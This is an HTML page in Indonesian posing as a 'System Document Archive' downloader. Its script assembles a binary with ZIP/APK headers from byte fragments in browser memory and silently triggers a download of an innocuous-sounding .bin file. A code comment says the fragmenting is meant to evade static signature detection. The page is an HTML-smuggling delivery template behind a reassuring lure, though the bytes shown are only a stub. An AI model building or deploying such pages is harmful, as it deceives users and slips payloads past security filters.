<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Document Archive Dispatcher v2.5</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #090d16;
  color: #f8fafc;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
}
.panel {
  background: #111827;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
  max-width: 540px;
  width: 100%;
  border: 1px solid #1f2937;
  text-align: center;
}
h2 { 
  margin-bottom: 10px; 
  font-size: 22px;
  color: #f3f4f6;
  font-weight: 700;
}
p { 
  margin-bottom: 24px; 
  line-height: 1.6; 
  color: #9ca3af;
  font-size: 14px;
}
button {
  width: 100%;
  padding: 16px;
  cursor: pointer;
  border: none;
  border-radius: 10px;
  background: #3b82f6;
  color: #ffffff;
  font-weight: 600;
  font-size: 16px;
  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
  transition: all 0.2s ease;
}
button:hover { 
  background: #2563eb; 
  transform: translateY(-1px);
  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
}
#status {
  margin-top: 20px;
  font-weight: 500;
  color: #38bdf8;
  padding: 14px;
  background: rgba(56, 189, 248, 0.1);
  border-radius: 8px;
  font-size: 13px;
  border: 1px solid rgba(56, 189, 248, 0.2);
}
#downloads {
  margin-top: 20px;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
  gap: 8px;
  max-height: 180px;
  overflow-y: auto;
  padding-right: 4px;
}
#downloads a {
  display: block;
  padding: 10px;
  background: #1f2937;
  color: #4ade80;
  text-decoration: none;
  border-radius: 6px;
  font-size: 11px;
  font-family: monospace;
  text-align: center;
  border: 1px solid #374151;
  word-break: break-all;
}
</style>
</head>

<body>
<div class="panel">
  <h2>Arsip Dokumen Sistem</h2>
  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas arsip pendukung secara aman.</p>

  <button id="start-btn" type="button">Unduh Dokumen Arsip (.bin)</button>

  <div id="status" role="status">Sistem siap diinisialisasi.</div>
  <div id="downloads"></div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

// Fragmentasi buffer biner untuk menghindari deteksi signature statis monolitik
const chunkFragments = [
  new Uint8Array([0x50, 0x4B, 0x03, 0x04]), // Bagian Header ZIP/APK (Magic Bytes)
  new Uint8Array([0x14, 0x00, 0x08, 0x00]), // Bagian metadata kompresi
  new Uint8Array([0x08, 0x00, 0x21, 0x56]), // Bagian struktur internal file
  new Uint8Array([0x78, 0x56, 0x34, 0x12])  // Padding tambahan
];

const assembleChunks = (chunks) => {
  const totalLength = chunks.reduce((acc, chunk) => acc + chunk.length, 0);
  const mergedArray = new Uint8Array(totalLength);
  
  let offset = 0;
  for (const chunk of chunks) {
    mergedArray.set(chunk, offset);
    offset += chunk.length;
  }
  
  return mergedArray;
};

startBtn.addEventListener("click", () => {
  statusDiv.textContent = "Merakit berkas di memori...";
  
  setTimeout(() => {
    try {
      const binaryData = assembleChunks(chunkFragments);
      const blob = new Blob([binaryData], { type: 'application/octet-stream' });
      const blobUrl = URL.createObjectURL(blob);

      const link = document.createElement("a");
      link.href = blobUrl;
      link.download = "arsip-laporan-sistem.bin";
      link.textContent = "Arsip_Data.bin";
      link.style.display = "none";
      
      downloadsDiv.appendChild(link);
      link.click();

      statusDiv.textContent = "Berkas berhasil diproses dan diunduh.";

      setTimeout(() => {
        URL.revokeObjectURL(blobUrl);
      }, 2000);

    } catch (err) {
      statusDiv.textContent = "Gagal memproses inisialisasi berkas.";
    }
  }, 500);
});
</script>
</body>
</html>
